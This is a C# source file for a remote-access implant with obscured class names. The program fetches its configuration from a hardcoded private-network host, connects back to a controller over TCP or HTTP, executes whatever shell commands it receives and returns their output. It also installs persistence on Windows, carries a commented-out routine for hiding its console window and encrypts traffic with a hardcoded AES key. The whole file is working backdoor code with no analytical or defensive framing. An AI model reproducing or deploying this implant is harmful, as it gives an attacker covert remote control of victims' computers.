using System.Threading.Tasks;
using System.Text;
using System.Net;

using tevsn;
using hevsn;
using cevsn.encrn.rsa;
using cevsn.encrn;

using System.Runtime.InteropServices;
using System.Diagnostics;

namespace cevsn
{
    public class Cevsn
    {
        //Windows hide Console
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        public static String URL = "http://192.168.62.131:8082/initialRSA.txt";
        public static String UUID = Guid.NewGuid().ToString();
        public volatile static byte[] iv = new byte[16];
        public volatile static string Key = "";
        public volatile static string PrivKey = "";
        public volatile static String IP = "";
        public volatile static int PORT = 0;
        public volatile static string Type = "";
        public volatile static string Pass = "";
        public volatile static string Salt = "";
        public static readonly HttpClient client = new HttpClient();
        public volatile static Tevsn? tevsn = null;
        public volatile static Hevsn? hevsn = null;
        public volatile static cevsn.encrn.rsa.RSA? rsa = null;
        public volatile static AES? aes = null;
        public volatile static Boolean IsConnected = false;
        public volatile static Boolean Running = false;
        public volatile static Boolean first = false;
        public volatile static int counter = 0;
        public volatile static Boolean firstHTTP = false;
        public volatile static Pevsn? Persist = null;

        public volatile static string cont = "";
        public volatile static Boolean gotHostInformation = false;
        public volatile static string osName = "";

        public static async Task Main(string[] args)
        {
            osName = getOsName();
            if(osName.Contains("Win"))
            {
                //IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
                //ShowWindow(h, 0);
            }
            gotHostInformation = false;
            Running = true;
            //new Privsn();
            
            await Task.Factory.StartNew(() => 
            {
                while(Running)
                {
                    while(gotHostInformation == false)
                    {
                        URL = "http://192.168.62.131:8082/"+UUID+".txt";
                        cont = getContent();
                        if(cont == "")
                        {
                            URL = "http://192.168.62.131:8082/initialRSA.txt";
                            Update();
                        } else {
                            parseHostInformation(cont);
                        }
                        Thread.Sleep(3500);
                    }
                    Boolean checker = false;
                    while(gotHostInformation)
                    {
                        if(counter > 5)
                        {
                            gotHostInformation = false;
                            counter = 0;
                        }
                        if(Type.Equals("TCP"))
                        {
                            Console.Write("Trying to connect to TCP...\n");
                            if(checker == false)
                            {
                                tevsn = CreateTevsn(IP, PORT, Key, osName);
                                tevsn.ServerAddress = new IPEndPoint(IPAddress.Parse(IP), PORT);
                                checker = true;
                            }
                            if(tevsn!.Connect())
                            {
                                Console.Write("connected\n");
                                IsConnected = tevsn.IsConnected();
                                if(osName.Contains("Windows"))
                                {
                                    Persist = new Pevsn();
                                }
                                while(IsConnected)
                                {
                                    if(!first)
                                    {
                                        try
                                        {
                                            Console.Write("Sending to Server first Conn!\n");
                                            tevsn.Send(UUID + ": just arrived to vacation on: " + osName);
                                            URL = "http://"+IP+":8082/"+UUID+".txt";
                                            Thread.Sleep(5000);
                                            try
                                            {
                                                Update();
                                                //rsa!.PrivKey = PrivKey;
                                            } catch (Exception) {
                                                Console.Write("Failed to get private key!\n");
                                            }
                                            string recv1 = tevsn.Receive();
                                            if (recv1.Equals("reviveTime")) {
                                                IsConnected = tevsn.IsConnected();
                                                if(!IsConnected)
                                                {
                                                    tevsn.Fallback();
                                                    first = false;
                                                    break;
                                                }
                                            } else if(recv1.Equals("--")) {
                                                tevsn.Send("keepalive");
                                            } else if (recv1.Equals("httpSw")) {
                                                Type = "HTTP";
                                                firstHTTP = false;
                                                Update();
                                                tevsn.Disconnect();
                                                break;
                                            } else {
                                                tevsn.Send(tevsn.exec(recv1));
                                            }
                                            IsConnected = tevsn.IsConnected();
                                            first = true;
                                            Thread.Sleep(1000);
                                        } catch (Exception) {
                                            IsConnected = tevsn.IsConnected();
                                            if(!IsConnected)
                                            {
                                                first = false;
                                                break;
                                            }
                                        }
                                    } else {
                                        Console.Write("\nWaiting\n");
                                        string recv = tevsn.Receive();
                                        Console.Write(recv);
                                        if (recv.Equals("reviveTime")) {
                                            IsConnected = tevsn.IsConnected();
                                            if(!IsConnected)
                                            {
                                                tevsn.Fallback();
                                                first = false;
                                                break;
                                            }
                                        } else if(recv.Equals("--")) {
                                            tevsn.Send("keepalive");
                                        } else if (recv.Equals("httpSw")) {
                                            Type = "HTTP";
                                            firstHTTP = false;
                                            Update();
                                            tevsn.Disconnect();
                                            tevsn = null;
                                            break;
                                        } else {
                                            tevsn.Send(tevsn.exec(recv));
                                        }
                                    }
                                    Thread.Sleep(2500);
                                }
                            }
                        }
                        if(Type.Equals("HTTP"))
                        {
                            while(Type.Equals("HTTP"))
                            {
                            //hevsn = new Hevsn("http://192.168.62.131:8082:"+PORT+"/lit", rsa!);
                                if(!firstHTTP)
                                {
                                    aes = new AES("lol123", iv);
                                    hevsn = new Hevsn("http://"+IP+":"+PORT+"/lit", aes);
                                    Thread.Sleep(2000);
                                    hevsn.sendInit();
                                    firstHTTP = true;
                                }
                                try
                                {
                                    hevsn!.getCommands("give");
                                    if(hevsn.getCommand().Length > 1)
                                    {
                                        string comm = hevsn.getCommand();
                                        if(!comm.Equals("") && comm.Length >= 2)
                                        {
                                            if (comm.Equals("tcpSw")) 
                                            {
                                                Type = "TCP";
                                                checker = false;
                                                Update();
                                                first = false;
                                                hevsn = null;
                                            } else if(comm.Equals("httpSw")) {
                                                firstHTTP = false;
                                            } else {
                                                hevsn.SendOutp(hevsn.makeOutp(hevsn.exec(comm)));
                                            }
                                        }
                                    }
                                    Thread.Sleep(3000);
                                } catch (NullReferenceException) {
                                    firstHTTP = false;
                                }
                            }
                        }
                        counter++;
                        Thread.Sleep(2000);

                    }
                }

            });
            
        }

        public static void Update()
        {
            string cont = getContent();
            parseHostInformation(cont);
        }

        //create getOsName method
        public static string getOsName()
        {
            string os = "";
            switch (Environment.OSVersion.Platform)
            {
                case PlatformID.Win32NT:
                    os = "Windows";
                    break;
                case PlatformID.Unix:
                    os = "Linux";
                    break;
                case PlatformID.MacOSX:
                    os = "MacOSX";
                    break;
                default:
                    os = "Unknown";
                    break;
            }
            return os;
        }

        static String getContent()
        {
            try 
            {
                client.DefaultRequestHeaders.Add("Bypass-Tunnel-Reminder", "Flip");
                Task<string> response = client.GetStringAsync(URL);
                if(response.Result.ToString().Length > 5)
                {
                    Console.Write("Got content from server! \n");
                }
                    
                return response.Result.ToString();
            } catch (Exception)
            {
                Console.Write("Trying to connect to webserver..." + "\n");
                return "";
            }
            
        }

        public static void parseHostInformation(string content) {
            if(content != "")
            {
                string[] lines = content.Split(';');
                IP = lines[0];
                PORT = Int32.Parse(lines[1]);
                Type = Encoding.UTF8.GetString(Convert.FromBase64String(lines[2]));
                iv = Convert.FromBase64String(lines[3]);
                /*
                if(lines.Length > 4)
                {
                    Console.Write("Got PRIV!\n");
                    PrivKey = lines[4];
                }
                */
                gotHostInformation = true;
            }
        }

        public static Tevsn CreateTevsn(string ip, int port, string key, string os)
        {
            //rsa = new encrn.rsa.RSA(key);
            aes = new AES("lol123", iv);
            Console.Write(ip + "\n");
            return new Tevsn(ip, port, aes, os);
        }
        
    }
}